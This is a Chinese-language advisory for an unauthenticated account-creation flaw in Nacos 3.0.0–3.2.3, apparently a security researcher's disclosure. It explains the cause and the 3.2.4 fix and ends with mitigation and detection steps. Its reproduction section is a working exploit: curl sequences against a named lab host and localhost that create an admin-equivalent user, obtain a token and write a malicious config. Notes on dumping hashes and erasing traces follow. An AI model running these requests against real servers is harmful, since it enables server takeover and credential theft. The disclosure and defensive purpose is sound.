Nacos 3.0.0 ~ 3.2.3 存在一个鉴权作用域错配问题：用户、角色、权限三个管理接口落在了一个默认不鉴权的作用域里。攻击者不需要任何凭证，就能在 8848 端口上给自己建账号、发权限，然后正常登录拿到 token，等同接管整个服务端。3.2.4 修复。

- 影响版本：3.0.0 ~ 3.2.3
- 修复版本：3.2.4
- 攻击面：服务端主端口 8848（SDK/gRPC 用的端口，生产上基本都对内网开着）
- 前置条件：无。即使按官方文档把 admin、console 鉴权全开也一样能打

## 成因

Nacos 3.x 把接口鉴权按 `@Secured(apiType = ...)` 分了几个作用域，每个作用域一个开关：

- `ADMIN_API` 走 `AuthAdminFilter`，开关 `nacos.core.auth.admin.enabled`，默认开
- `CONSOLE_API` 归控制台，开关 `nacos.core.auth.console.enabled`，默认开
- `OPEN_API` 走 `AuthFilter`，开关 `nacos.core.auth.enabled`，**默认关**

问题在于 `apiType` 的默认值就是 `OPEN_API`（`Secured.java`），而 `UserControllerV3`、`RoleControllerV3`、`PermissionControllerV3` 的注解都没写这个属性：

```java
// 3.2.3, UserControllerV3.createUser
@Secured(resource = AuthConstants.CONSOLE_RESOURCE_NAME_PREFIX + "users",
    action = ActionTypes.WRITE)          // 没写 apiType
@PostMapping
public Result<String> createUser(@RequestParam String username, @RequestParam String password) {
```

于是这三个接口被默认关闭的 `AuthFilter` 把守，直接放行；而默认开启的 `AuthAdminFilter` 只匹配 `apiType == ADMIN_API`，根本不管它们。过滤器的放行逻辑在 `AbstractWebAuthFilter` 里，作用域开关一关就 `chain.doFilter` 了。

3.2.4 的修复很简单，就是补上注解：

```diff
 @Secured(resource = AuthConstants.CONSOLE_RESOURCE_NAME_PREFIX + "users",
-    action = ActionTypes.WRITE)
+    action = ActionTypes.WRITE, apiType = ApiType.ADMIN_API)
```


## 复现

一般Nacos有两个端口，一个提供api服务，一个是webui界面
这里环境：
[hbc2.haobachang.com:27616]--api服务

[hbc2.haobachang.com:51453]--webui界面

复现步骤：要针对api服务这里去执行相关操作

```
未授权创建用户
curl -s -X POST "http://hbc2.haobachang.com:27616/nacos/v3/auth/user" -d "username=poc_user&password=Poc@123456"
```
![](images/Pasted%20image%2020261011233120.png)
```
绑定角色
curl -s -X POST "http://hbc2.haobachang.com:27616/nacos/v3/auth/role" -d "role=poc_role&username=poc_user"
```

![](images/Pasted%20image%2020261011233429.png)
```
添加读写权限
curl -s -X POST "http://hbc2.haobachang.com:27616/nacos/v3/auth/permission" -d "role=poc_role&resource=*:*&action=rw"
```
![](images/Pasted%20image%2020261011233503.png)

```
登录获取token
curl -s -X POST "http://hbc2.haobachang.com:27616/nacos/v3/auth/user/login" -d "username=poc_user&password=Poc@123456"
```
![](images/Pasted%20image%2020261011233535.png)
```
获取配置
curl -s "http://hbc2.haobachang.com:27616/nacos/v3/admin/cs/config/list?pageNo=1&pageSize=10" -H "accessToken: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJwb2NfdXNlciIsImV4cCI6MTc5MTc1MDM3M30.jEIlOYTAYDnBpgbV7aWhTuGH4YTrdiWw3fzoOQbRy9o"
```
![](images/Pasted%20image%2020261011233924.png)

```
写入恶意配置文件
curl -s -X POST "http://hbc2.haobachang.com:27616/nacos/v3/admin/cs/config" -H "accessToken:  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJwb2NfdXNlciIsImV4cCI6MTc5MTc1MDM3M30.jEIlOYTAYDnBpgbV7aWhTuGH4YTrdiWw3fzoOQbRy9o" --data-urlencode "dataId=pwned.yml" --data-urlencode "groupN
ame=DEFAULT_GROUP" --data-urlencode "namespaceId=public" --data-urlencode "content=written by unauth attacker"
```

![](images/Pasted%20image%2020261011233956.png)
写入的配置文件已经落地，也可以在面板中查看：
![](images/Pasted%20image%2020261011234152.png)
```shell
# 1. 未授权建号
$ curl -s -X POST "http://127.0.0.1:8848/nacos/v3/auth/user" -d "username=poc_user&password=Poc@123456"
{"code":0,"message":"success","data":"create user ok!"}

# 2. 绑角色。
ROLE_ADMIN 是保留角色会被业务层拦掉：
$ curl -s -X POST "http://127.0.0.1:8848/nacos/v3/auth/role" -d "role=ROLE_ADMIN&username=poc_user"
{"status":500,...,"message":"role 'ROLE_ADMIN' is not permitted to create!"}
# 换自定义角色就行：
$ curl -s -X POST "http://127.0.0.1:8848/nacos/v3/auth/role" -d "role=poc_role&username=poc_user"
{"code":0,"message":"success","data":"add role ok!"}

# 3. 给自定义角色发 *:* 读写权限，效果和 admin 等价
$ curl -s -X POST "http://127.0.0.1:8848/nacos/v3/auth/permission" -d "role=poc_role&resource=*:*&action=rw"
{"code":0,"message":"success","data":"add permission ok!"}

# 4. 登录拿 token（nacos.core.auth.caching.enabled 默认开着，刚建的号要等 15s 左右缓存刷新才能登上）
$ curl -s -X POST "http://127.0.0.1:8848/nacos/v3/auth/user/login" -d "username=poc_user&password=Poc@123456"
{"accessToken":"eyJhbGciOiJIUzI1NiJ9....","tokenTtl":18000,"globalAdmin":false,"username":"poc_user"}

# 5. 用这个 token 干 admin 才能干的事，比如列配置、写配置
$ curl -s "http://127.0.0.1:8848/nacos/v3/admin/cs/config/list?pageNo=1&pageSize=10" -H "accessToken: $TOKEN"
{"code":0,"message":"success","data":{"totalCount":0,...}}

写恶意yml配置
$ curl -s -X POST "http://127.0.0.1:8848/nacos/v3/admin/cs/config" -H "accessToken: $TOKEN" \
    --data-urlencode "dataId=pwned.yml" --data-urlencode "groupName=DEFAULT_GROUP" \
    --data-urlencode "namespaceId=public" --data-urlencode "content=written by unauth attacker"
{"code":0,"message":"success","data":true}
```

另外几个细节：

- `GET /v3/auth/user/list` 未授权能直接拖全部用户名和 bcrypt 哈希，可以当无损检测点
- 对应的 DELETE 接口同样未授权可用，攻击者打完可以把痕迹清干净
- 能拿到全部配置的读写，等于数据库/中间件凭证都能看，再配合客户端配置注入可以往 RCE 走


## 修复建议

- 升级到 3.2.4 及以上
- 升级前临时缓解：开 `nacos.core.auth.enabled=true`（OPEN_API 作用域也会鉴权），或者在网关上把 8848 的 `/v3/auth/*` 限到可信来源
- 排查是否已被打：看 `users`/`roles`/`permissions` 表里有没有来历不明、带 `*:*` 权限的账号；翻访问日志里 `POST /v3/auth/user`、`POST /v3/auth/permission` 无 token 返回 2xx 的记录